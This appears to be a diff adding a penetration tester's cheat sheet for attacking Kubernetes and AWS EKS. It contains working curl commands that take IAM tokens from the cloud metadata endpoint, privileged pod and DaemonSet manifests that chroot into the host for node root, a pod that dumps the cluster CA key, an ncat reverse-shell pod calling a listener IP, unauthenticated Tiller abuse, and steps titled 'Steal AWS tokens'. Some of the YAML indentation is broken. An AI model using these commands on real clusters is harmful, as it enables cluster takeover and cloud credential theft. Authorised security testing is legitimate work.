@@ -1,0 +1,192 @@
+testing creds usually come as .kube/config file
+	look for in dev systems post-exploitation
+
+Cloud Metadata Services
+	AWS/Azure - 169.254.169.254
+	GCP - metadata.google.internal
+	possible container breakout
+		access to IAM tokens
+			not easy to block access from EC2 or K8s
+				K8s may be provided with excessive permissions to manage EC2 for autoscaling
+			curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+			curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+		access to K8s tokens
+
+Allowing pod creation leads to privesc through various routes
+	can create privileged Docker containers and breakout to node
+	risks even with PSP enabled
+
+Check for impersonation rights 
+
+Compromised User Attacks
+	Root on node if you have pod creation rights and pod exec rights
+		noderoot.yml 
+			apiVersion: v1
+			kind: Pod
+			metadata: 
+			  name: noderootpod
+			  labels:
+			spec:
+			  hostNetwork: true
+			  hostPID: true
+			  hostIPC: true
+			  containers:
+			  - name: noderootpod
+			    image: busybox
+			    securityContext:
+			      privileged: true
+				volumeMounts:
+				- mountPath: /host
+				  name: noderoot
+				command: [ "/bin/sh", "-c", "--" ]
+				args: [ "while true; do sleep 30; done;" ]
+			  volumes:
+			  - name: noderoot
+			    hostPath:
+			      path: /
+
+		kubectl create -f /path/to/noderoot.yml
+		kubectl exec -it noderootpod chroot /host
+
+		and get cluster CA key
+			/etc/kubernetes/pki/ca.key
+
+	Root on all nodes (incl master nodes) in a cluster if you have create pod rights and pod exec rights
+		nodedeamon.yml
+			apiVersion: apps/v1
+			kind: DaemonSet
+			metadata:
+			  name: noderootpod
+			  labels:
+			spec:
+			  selector:
+			    matchLabels:
+			 	  name: noderootdaemon
+			  template:
+			    metadata:
+			 	  labels:
+			 	    name: noderootdaemon
+				spec:
+				  tolerations:
+				  - key: node-role.kubernetes.io/master
+				    effect: NoSchedule
+				  hostNetwork: true
+				  hostPID: true
+				  hostIPC: true
+				  containers:
+				  - name: noderootpod
+				    image: busybox
+				    securityContext:
+				      privileged: true
+					volumeMounts:
+					- mountPath: /host
+					  name: noderoot
+					command: [ "/bin/sh", "-c", "--" ]
+					args: [ "while true; do sleep 30; done;" ]
+				  volumes:
+				  - name: noderoot
+				    hostPath:
+				      path: /
+
+		kubectl create -f /path/to/nodedaemon.yml
+		kubectl exec -it noderootpod chroot /host
+
+
+	Root on node via hostPath if you have pod creation rights
+		Works on Master Nodes - mounts PKI directory in container to dump cluster CA key
+		key-dumper-pod.yml 
+			apiVersion: v1
+			kind: Pod
+			metadata: 
+			  name: key-dumper-pod
+			  labels:
+			spec:
+			  containers:
+			  - name: keydumper-pod
+			    image: busybox
+			    volumeMounts:
+			    - mountPath: /pki
+			      name: keyvolume
+			    command: ['cat', '/pki/ca.key']
+			  volumes:
+			  - name: keyvolume
+			    hostPath:
+			      path: /etc/kubernetes/pki
+			      type: directory
+
+		kubectl create -f key-dumper-pod.yml
+		kubectl logs key-dumper-pod
+
+	Root on node via reverse shell if you have pod creation rights
+		start nc listener (ncat -nvlp <listener_port>)
+
+		ncat-reverse-shell-pod.yml 
+			apiVersion: v1
+			kind: Pod
+			metadata: 
+			  name: ncat-reverse-shell-pod
+			  labels:
+			spec:
+			  containers:
+			  - name: ncat-reverse-shell
+			    image: raesene/ncat
+			    volumeMounts:
+			    - mountPath: /host
+			      name: hostvolume
+			    command: ['<listener_IP>', '<listener_port>', '-e', '/bin/bash']
+			  volumes:
+			  - name: hostvolume
+			    hostPath:
+			      path: /
+			      type: directory
+
+		kubectl create -f ncat-reverse-shell-pod.yml
+		
+port-forwarding
+	get direct access to a pod's services from a local machine
+		portforward cluster services to the machine you run kubectl on
+		kubectl port-forward pod/<pod_name> --address <destination_IP> <destination_port>:<pod_service_port>
+	good for getting screenshots
+
+file copying
+	copy files out of a container
+		kubectl cp default/<pod_name>:/path/to/file/in/container /path/to/copy/destination
+	good for collecting evidence for reporting
+
+Run any Helm Chart using Tiller and gain node root access
+	helm --host tiller-deploy.kube-system.svc.cluster.local:44134 install /path/to/chart
+
+	Demonstrating Tiller is running unauthenticated
+		helm --host tiller-deploy.kube-system.svc.cluster.local:44134 version
+		helm --host tiller-deploy.kube-system.svc.cluster.local:44134 ls
+
+AWS K8s
+
+	Check for permission & priv esc
+	
+		./octopus-gather.sh
+			#This creates the folder "out" and all files will be created in here - octopus.py uses the files located here
+
+		aws eks describe-cluster --output json --name <cluster_name> > ./out/eks-cluster-config.json
+
+		python3 octopus.py --input out --output out --cloud-config-file ./out/eks-cluster-config.json > ./out/octopus_overview
+
+		mv ./out <destination_path>
+
+		mv <destination_path>/out/octopus_overview <destination_path>
+
+		cd <destination_path>/out
+
+		cat <octopus-output-date.json> | jq > ../octopus_output
+
+	Steal AWS tokens
+
+		spin up a pod in their network:
+			kubectl run -it --image=smarticu5/container-review-admin ncc-test -- /bin/bash 
+
+		check for AWS permissions:
+			aws sts get-caller-identity
+
+		retrieve tokens:
+			TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X
+			-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
